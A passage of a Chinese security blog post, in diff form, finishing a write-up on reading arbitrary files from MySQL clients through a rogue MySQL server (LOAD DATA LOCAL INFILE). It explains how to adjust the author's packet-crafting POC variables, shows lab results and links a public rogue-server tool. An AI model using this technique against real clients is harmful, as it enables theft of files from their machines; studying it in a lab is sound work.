+<p>下面我讲一下怎么用这个脚本，即如何改greeting等变量。<br>因为我们是用socket进行发包，我们可以复习一下socket的定义。<strong>连接了应用层与传输层</strong>。<br><img src="/Web安全/Mysql/\Mysql客户端任意文件读取\\21.JPG" alt><br>既然socket是连接应用层与传输层的，那传输层、网络层、链路层等的报文部分就不需要我们自己构造了，那就直接复制导出wireshark导出之前抓的server greeting包的应用层部分即可。<br><img src="/Web安全/Mysql/\Mysql客户端任意文件读取\\20.jpg" alt><br>即构成我上面脚本的第15行的greeting变量<br>第17行的authok认证包，比对下好像没变，不需要改<br>第20-22行的File Transfer包就要结合要访问的文件路径改了。<br>比如我这里，我要读取的文件路径是<code>/root/桌面/test.txt</code>,长度是0x16，22，所以把payloadlen改为\x16,后面内容按上面的方法用wireshark复制导出即可。<br><img src="/Web安全/Mysql/\Mysql客户端任意文件读取\\23.jpg" alt></p>
+<h2 id="脚本测试结果"><a href="#脚本测试结果" class="headerlink" title="脚本测试结果"></a>脚本测试结果</h2><p>在win10下运行该脚本(脚本中改成监听3307端口),然后用kali连接。可以看到成功读取。<br><img src="/Web安全/Mysql/\Mysql客户端任意文件读取\\19.JPG" alt><br><img src="/Web安全/Mysql/\Mysql客户端任意文件读取\\18.JPG" alt></p>
+<p>上面是一个简单的脚本，我是为了加深一步理解所以修修补补改了改。理解完了之后，实际用肯定不优先用这个(还要自己改变量，烦的一比)，轮子肯定是不会重造的。</p>
+<p>所以这里放一个Github链接:<a href="https://github.com/allyshka/Rogue-MySql-Server" target="_blank" rel="noopener">https://github.com/allyshka/Rogue-MySql-Server</a></p>
+<p>这里也放一下这个github项目里python脚本的测试结果</p>
+<ol>
+<li>首先也是将脚本的监听端口改一下，然后再在filelist里加想要读的文件。<br><img src="/Web安全/Mysql/\Mysql客户端任意文件读取\\24.JPG" alt></li>
+<li>在win10下开启这个脚本，用kali连接<br><img src="/Web安全/Mysql/\Mysql客户端任意文件读取\\25.JPG" alt></li>
+<li>脚本运行后，会在当前目录下生成mysql.log目录，有客户端连接上后，进行记录，并且将文件读取存入，我们打开mysql.log文件，可以看到成功读取。<br><img src="/Web安全/Mysql/\Mysql客户端任意文件读取\\26.JPG" alt></li>
+</ol>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.vesiluoma.com/abusing-mysql-clients/" target="_blank" rel="noopener">Abusing MySQL clients to get LFI from the server/client</a><br><a href="https://www.smi1e.top/mysql-load-data-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/" target="_blank" rel="noopener">MySQL LOAD DATA 读取客户端任意文件</a><br><a href="https://lightless.me/archives/read-mysql-client-file.html#_label1" target="_blank" rel="noopener">Read MySQL Client’s File</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>ヾﾉ≧∀≦)o 来呀！快活呀！~</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById(&quot;QR&quot;); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="Miracle778 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="Miracle778 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web安全/" rel="tag"><i class="fa fa-tag"></i> Web安全</a>
+          
+            <a href="/tags/Mysql/" rel="tag"><i class="fa fa-tag"></i> Mysql</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/CTF/DDCTF/ddctf-2019-web.html" rel="next" title="ddctf-2019 web">
+                <i class="fa fa-chevron-left"></i> ddctf-2019 web
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  <div>
+    
+    <div>
+    
+    <div style="text-align:center;color: #000;font-size:17px; font-family:STLiti;">
+	-------- 本文结束 --------
+	</div>
+<div style="border: 1px solid black">
+<div style="margin-left:10px">
+<p style="font-size: 10px;line-height: 30px"><a href="https://miracle778.github.io" style="color:#258FC6">Miracle's Blog</a> by <a href="https://miracle778.github.io" style="color:#258FC6">Miracle778</a> is licensed under a <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" style="color:#258FC6">Creative Commons BY-NC-ND 4.0 International License</a>.
+<br>
+由<a href="https://miracle778.github.io" style="color:#258FC6">Miracle778</a>创作并维护的<a href="https://miracle778.github.io" style="color:#258FC6">Miracle778's Blog</a>博客采用<a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" style="color:#258FC6">创作共用保留署名-非商业-禁止演绎4.0国际许可证</a>。<br>
+本文首发于<a href="https://miracle.github.io" style="color:#258FC6">Miracle's Blog</a> 博客（ <a href="https://miracle778.github.io" style="color:#258FC6">https://miracle778.github.io</a> ），版权所有，侵权必究。</p>
+</div>
+</div>
+    
+</div>
+
+    
+ </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/米兔.jpg" alt="Miracle778">
+            
+              <p class="site-author-name" itemprop="name">Miracle778</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">13</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">19</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">23</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/Miracle778" title="GitHub &rarr; https://github.com/Miracle778" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="mailto:Yiitao@163.com" title="E-Mail &rarr; mailto:Yiitao@163.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+          
+          <br>
+          <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=29045579&auto=0&height=32"></iframe>
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Load-Data-infile"><span class="nav-number">2.</span> <span class="nav-text">Load Data infile</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#抓包分析"><span class="nav-number">3.</span> <span class="nav-text">抓包分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#实验环境"><span class="nav-number">3.1.</span> <span class="nav-text">实验环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#开始测试"><span class="nav-number">3.2.</span> <span class="nav-text">开始测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#流量分析"><span class="nav-number">3.3.</span> <span class="nav-text">流量分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#伪造mysql服务端"><span class="nav-number">4.</span> <span class="nav-text">伪造mysql服务端</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#理论分析"><span class="nav-number">4.1.</span> <span class="nav-text">理论分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#编写POC"><span class="nav-number">4.2.</span> <span class="nav-text">编写POC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#脚本测试结果"><span class="nav-number">4.3.</span> <span class="nav-text">脚本测试结果</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-snowflake-o"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Miracle778</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">站点总字数：</span>
+    
+    <span title="站点总字数">127k</span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    
+    <span title="站点阅读时长">1:56</span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=7.0.1"></script>
+
+  <script src="/js/src/motion.js?v=7.0.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=7.0.1"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=7.0.1"></script>
+
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=7.0.1"></script>
+<script src="/js/src/post-details.js?v=7.0.1"></script>
+
+
+
+  
+
+
+  <script src="/js/src/next-boot.js?v=7.0.1"></script>
+
+
+  
+
+  
+
+  
+
+  
+  
+
+<script src="//cdn1.lncld.net/static/js/3.11.1/av-min.js"></script>
+
+
+
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+
+<script>
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#comments',
+    verify: false,
+    notify: false,
+    appId: 'w9nX4X8WpdsRFrCFoTt7cpqz-gzGzoHsz',
+    appKey: 'H3aV3vWVqkmAgeD0ep6RVf07',
+    placeholder: 'ヾﾉ≧∀≦)o 来呀！快活呀！~',
+    avatar: 'mm',
+    meta: guest,
+    pageSize: '10' || 10,
+    visitor: false,
+    lang: '' || 'zh-cn'
+  });
+</script>
+
+
+
+
+  
+
+
+  
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script>
+  $('.highlight').each(function(i, e) {
+    var $wrap = $('<div>').addClass('highlight-wrap');
+    $(e).after($wrap);
+    $wrap.append($('<button>').addClass('copy-btn').append('复制').on('click', function(e) {
+      var code = $(this).parent().find('.code').find('.line').map(function(i, e) {
+        return $(e).text();
+      }).toArray().join('\n');
+      var ta = document.createElement('textarea');
+      var yPosition = window.pageYOffset || document.documentElement.scrollTop;
+      ta.style.top = yPosition + 'px'; // Prevent page scroll
+      ta.style.position = 'absolute';
+      ta.style.opacity = '0';
+      ta.readOnly = true;
+      ta.value = code;
+      document.body.appendChild(ta);
+      ta.select();
+      ta.setSelectionRange(0, code.length);
+      ta.readOnly = false;
+      var result = document.execCommand('copy');
+      
+      ta.blur(); // For iOS
+      $(this).blur();
+    })).on('mouseleave', function(e) {
+      var $b = $(this).find('.copy-btn');
+      setTimeout(function() {
+        $b.text('复制');
+      }, 300);
+    }).append(e);
+  })
+</script>
+
+
+  
+
+  
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+</body>
+</html>
